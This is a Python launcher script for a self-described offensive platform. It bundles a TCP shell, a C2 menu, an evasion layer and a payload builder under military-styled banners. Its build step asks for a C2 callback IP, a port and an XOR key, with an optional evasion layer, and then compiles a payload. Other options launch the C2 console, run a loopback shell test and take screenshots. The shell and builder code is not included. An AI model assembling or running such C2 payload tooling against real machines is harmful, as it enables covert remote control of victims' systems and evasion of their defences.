#!/usr/bin/env python3
"""
FLAGSHIP — Unified Iron-Dome Platform
rainfantry / George Wu
Inspiration: asi dev — IDF Staff Sergeant First Class

Combines: iron-sun (TCP shell) + CHEYANNE (C2) + VADER (evasion) + IRON-DOME (builder)
"""

import os, sys, subprocess, datetime, platform, shutil
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

# ── COLOURS ──────────────────────────────────────────────────────────────────

GOLD  = "\033[38;2;255;215;0m"
CYAN  = "\033[38;2;0;229;255m"
GREEN = "\033[38;2;0;255;100m"
RED   = "\033[38;2;255;60;60m"
IDF   = "\033[38;2;0;56;184m"
WHITE = "\033[38;2;255;255;255m"
DIM   = "\033[38;2;120;120;120m"
BOLD  = "\033[1m"
RST   = "\033[0m"

# ── IRON-SUN DYNAMIC RAY ART ─────────────────────────────────────────────────

def iron_sun_art(W=76):
    """Dynamic rising-sun ray generator — sourced from iron_sun_suite.py."""
    C = W // 2
    rows = []
    for r in range(15):
        h = int(round(C * (14 - r) / 14))
        if h == 0:
            ln = [' '] * W; ln[C] = '✡'; rows.append(''.join(ln)); break
        ln = [' '] * W
        for i in range(17):
            p = int(round(C + (-1.0 + i * 0.125) * h))
            p = max(0, min(W - 1, p))
            ln[p] = '│' if abs(p - C) <= 1 else ('╲' if p < C else '╱')
        rows.append(''.join(ln))

    lines = []
    lines.append(f"{CYAN}  ╔{'═'*W}╗{RST}")
    lines.append(f"{CYAN}  ║{IDF}{'▓'*W}{CYAN}║{RST}")
    lines.append(f"{CYAN}  ║{IDF}{'▓'*W}{CYAN}║{RST}")
    for row in rows:
        lines.append(f"{CYAN}  ║{GOLD}{row.ljust(W)[:W]}{CYAN}║{RST}")
    lines.append(f"{CYAN}  ║{IDF}{'▓'*W}{CYAN}║{RST}")
    lines.append(f"{CYAN}  ║{WHITE}{'T H E   I R O N - S U N'.center(W)}{CYAN}║{RST}")
    lines.append(f"{CYAN}  ║{WHITE}{'A U S T R A L I A N   A R M Y   ·   2 2 D I V'.center(W)}{CYAN}║{RST}")
    lines.append(f"{CYAN}  ║{IDF}{'▓'*W}{CYAN}║{RST}")
    lines.append(f"{CYAN}  ║{IDF}{'▓'*W}{CYAN}║{RST}")
    lines.append(f"{CYAN}  ╚{'═'*W}╝{RST}")
    return '\n'.join(lines)

# ── FLAGSHIP BANNER ───────────────────────────────────────────────────────────

BANNER = f"""
{GOLD}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ███████╗██╗      █████╗  ██████╗ ███████╗██╗  ██╗██╗██████╗              ║
║    ██╔════╝██║     ██╔══██╗██╔════╝ ██╔════╝██║  ██║██║██╔══██╗             ║
║    █████╗  ██║     ███████║██║  ███╗███████╗███████║██║██████╔╝             ║
║    ██╔══╝  ██║     ██╔══██║██║   ██║╚════██║██╔══██║██║██╔═══╝              ║
║    ██║     ███████╗██║  ██║╚██████╔╝███████║██║  ██║██║██║                  ║
║    ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝                  ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                IRON-DOME          ·          IDF MAGEN DAVID                 ║
║            ╱▔▔▔▔▔▔▔▔▔▔╲                     ✦     ✦     ✦                   ║
║           ╱  ≋≋≋≋≋≋≋≋≋ ╲                ✦        ✡        ✦                ║
║          ╱  MISSILE      ╲             ✦      22DIV VADER      ✦            ║
║         ╱  INTERCEPTED    ╲               ✦        ✡        ✦               ║
║         ▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔                  ✦     ✦     ✦                  ║
║              DOME ACTIVE ✓          CHEYANNE C2  ·  OPSEC ACTIVE            ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  OPERATOR: rainfantry  ✦  CALLSIGN: RADON  ✦  OWN HARDWARE ONLY            ║
╚══════════════════════════════════════════════════════════════════════════════╝{RST}
"""

MENU = f"""
{CYAN}{BOLD}  ╔══════════════════════════════════════════╗
  ║          FLAGSHIP COMMAND MENU           ║
  ╠══════════════════════════════════════════╣
  ║  {GREEN}B{CYAN}  — BUILD    iron-dome payload            ║
  ║  {GREEN}T{CYAN}  — TEST     full suite (iron_sun_suite)  ║
  ║  {GREEN}L{CYAN}  — LIVE     loopback shell test          ║
  ║  {GREEN}C{CYAN}  — CHEYANNE launch C2 menu               ║
  ║  {GREEN}D{CYAN}  — DESIGNATE generate callsign           ║
  ║  {GREEN}W{CYAN}  — WATCH    screenshot monitor (3-shot)  ║
  ║  {GREEN}S{CYAN}  — SITREP   repo status                  ║
  ║  {GREEN}X{CYAN}  — EXIT                                  ║
  ╚══════════════════════════════════════════╝{RST}
"""

ROOT = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(ROOT, "FLAGSHIP_LOG.md")

def ts():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def log(msg, also_print=True):
    entry = f"[{ts()}] {msg}"
    if also_print:
        print(entry)
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(entry + "\n")

def section(title):
    bar = "═" * 60
    print(f"\n{GOLD}╔{bar}╗")
    print(f"║  {title:<58}║")
    print(f"╚{bar}╝{RST}\n")
    log(f"── {title} ──", also_print=False)

# ── WATCH (screenshot monitor) ───────────────────────────────────────────────

def watch_3():
    """Take 3 screenshots at 5s intervals. Save to flagship/screenshots/."""
    section("WATCH — 3-SHOT SCREENSHOT MONITOR")
    try:
        import mss, mss.tools
        shots_dir = os.path.join(ROOT, "screenshots")
        os.makedirs(shots_dir, exist_ok=True)
        with mss.mss() as sct:
            for i in range(1, 4):
                import time
                fname = f"watch_{i}_{datetime.datetime.now().strftime('%H%M%S')}.png"
                fpath = os.path.join(shots_dir, fname)
                sct.shot(output=fpath)
                print(f"  {GREEN}[{i}/3]{RST} {fname}")
                log(f"WATCH shot {i}/3: {fname}")
                if i < 3:
                    time.sleep(5)
        print(f"\n  {GREEN}[+]{RST} 3 screenshots saved to screenshots/")
        log("WATCH complete — 3 shots saved")
        return shots_dir
    except ImportError:
        print(f"  {RED}[!]{RST} mss not installed — installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "mss", "-q"])
        return watch_3()

# ── BUILD ────────────────────────────────────────────────────────────────────

def build():
    section("BUILD — IRON-DOME PAYLOAD")
    builder = os.path.join(ROOT, "iron_dome_builder.py")
    if not os.path.exists(builder):
        print(f"  {RED}[!]{RST} iron_dome_builder.py not found")
        log("BUILD FAILED: iron_dome_builder.py missing")
        return
    target = input(f"  {CYAN}C2 IP [{RST}192.168.1.145{CYAN}]: {RST}").strip() or "192.168.1.145"
    port   = input(f"  {CYAN}Port [{RST}4443{CYAN}]: {RST}").strip() or "4443"
    xor    = input(f"  {CYAN}XOR key [{RST}0xFC{CYAN}]: {RST}").strip() or "0xFC"
    vader  = input(f"  {CYAN}VADER layer 8? (y/N): {RST}").strip().lower() == 'y'
    cmd = [sys.executable, builder, "--target", target, "--port", port, "--xor", xor]
    if vader:
        cmd.append("--vader")
    log(f"BUILD cmd: {' '.join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True, cwd=ROOT)
    print(r.stdout)
    if r.returncode == 0:
        log("BUILD PASS")
    else:
        print(r.stderr)
        log(f"BUILD FAIL: {r.stderr[:200]}")

# ── TEST SUITE ────────────────────────────────────────────────────────────────

def run_suite():
    section("TEST — IRON-SUN FULL SUITE")
    suite = os.path.join(ROOT, "iron_sun_suite.py")
    if not os.path.exists(suite):
        print(f"  {RED}[!]{RST} iron_sun_suite.py not found")
        return
    log("SUITE START")
    r = subprocess.run([sys.executable, suite, "--recompile", "--verbose"],
                       capture_output=True, text=True, cwd=ROOT)
    print(r.stdout[-4000:] if len(r.stdout) > 4000 else r.stdout)
    if r.stderr:
        print(f"{DIM}{r.stderr[:500]}{RST}")
    verdict = "PASS" if r.returncode == 0 else "FAIL"
    log(f"SUITE {verdict} (exit {r.returncode})")
    with open(os.path.join(ROOT, "SUITE_RESULT.txt"), 'w', encoding='utf-8') as f:
        f.write(r.stdout)

# ── LIVE TEST ────────────────────────────────────────────────────────────────

def live_test():
    section("LIVE — LOOPBACK SHELL TEST")
    test = os.path.join(ROOT, "live_test.py")
    if not os.path.exists(test):
        print(f"  {RED}[!]{RST} live_test.py not found")
        return
    log("LIVE TEST START")
    r = subprocess.run([sys.executable, test],
                       capture_output=True, text=True, cwd=ROOT, timeout=60)
    print(r.stdout)
    verdict = "PASS" if r.returncode == 0 else "FAIL"
    log(f"LIVE TEST {verdict}")

# ── CHEYANNE ─────────────────────────────────────────────────────────────────

def launch_cheyanne():
    section("CHEYANNE — C2 MENU")
    menu = os.path.join(ROOT, "vader_menu.py")
    if not os.path.exists(menu):
        print(f"  {RED}[!]{RST} vader_menu.py not found — run from cheyanne dir")
        return
    log("CHEYANNE LAUNCHED")
    subprocess.run([sys.executable, menu], cwd=ROOT)

# ── DESIGNATE ────────────────────────────────────────────────────────────────

def designate():
    section("DESIGNATE — CALLSIGN GENERATOR")
    dpy = os.path.join(ROOT, "designate.py")
    if not os.path.exists(dpy):
        print(f"  {RED}[!]{RST} designate.py not found")
        return
    r = subprocess.run([sys.executable, dpy], capture_output=True, text=True, cwd=ROOT)
    print(r.stdout)
    log(f"DESIGNATE: {r.stdout.strip()[:80]}")

# ── SITREP ────────────────────────────────────────────────────────────────────

def sitrep():
    section("SITREP — PLATFORM STATUS")
    print(f"  {CYAN}Machine:{RST}  {platform.node()} / {platform.system()} {platform.release()}")
    print(f"  {CYAN}Python:{RST}   {sys.version.split()[0]}")
    gcc = shutil.which("gcc")
    print(f"  {CYAN}gcc:{RST}      {gcc or 'NOT FOUND'}")
    git = shutil.which("git")
    print(f"  {CYAN}git:{RST}      {git or 'NOT FOUND'}")
    print()
    files = [
        ("iron_sun.c",         "shell source"),
        ("iron_dome_builder.py","unified builder"),
        ("iron_sun_suite.py",  "test suite"),
        ("live_test.py",       "loopback test"),
        ("vader_menu.py",      "cheyanne C2"),
        ("designate.py",       "callsign gen"),
    ]
    for fname, desc in files:
        path = os.path.join(ROOT, fname)
        status = f"{GREEN}PRESENT{RST}" if os.path.exists(path) else f"{RED}MISSING{RST}"
        print(f"  {status}  {fname:<28} {DIM}{desc}{RST}")

    shots = os.path.join(ROOT, "screenshots")
    if os.path.exists(shots):
        count = len([f for f in os.listdir(shots) if f.endswith('.png')])
        print(f"\n  {GREEN}[+]{RST} {count} screenshots in screenshots/")

    log("SITREP run")

# ── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    print(iron_sun_art())
    print(BANNER)

    # Init log
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"\n# FLAGSHIP SESSION — {ts()}\n")
        f.write(f"# Machine: {platform.node()} / {platform.system()} {platform.release()}\n\n")

    log("FLAGSHIP LAUNCHED")

    while True:
        print(MENU)
        try:
            choice = input(f"  {GOLD}FLAGSHIP>{RST} ").strip().upper()
        except (KeyboardInterrupt, EOFError):
            print(f"\n  {DIM}[exit]{RST}")
            break

        if   choice == 'B': build()
        elif choice == 'T': run_suite()
        elif choice == 'L': live_test()
        elif choice == 'C': launch_cheyanne()
        elif choice == 'D': designate()
        elif choice == 'W': watch_3()
        elif choice == 'S': sitrep()
        elif choice == 'X':
            log("FLAGSHIP EXIT")
            print(f"\n  {DIM}Stand down.{RST}\n")
            break
        else:
            print(f"  {RED}Unknown command.{RST}")

if __name__ == "__main__":
    main()
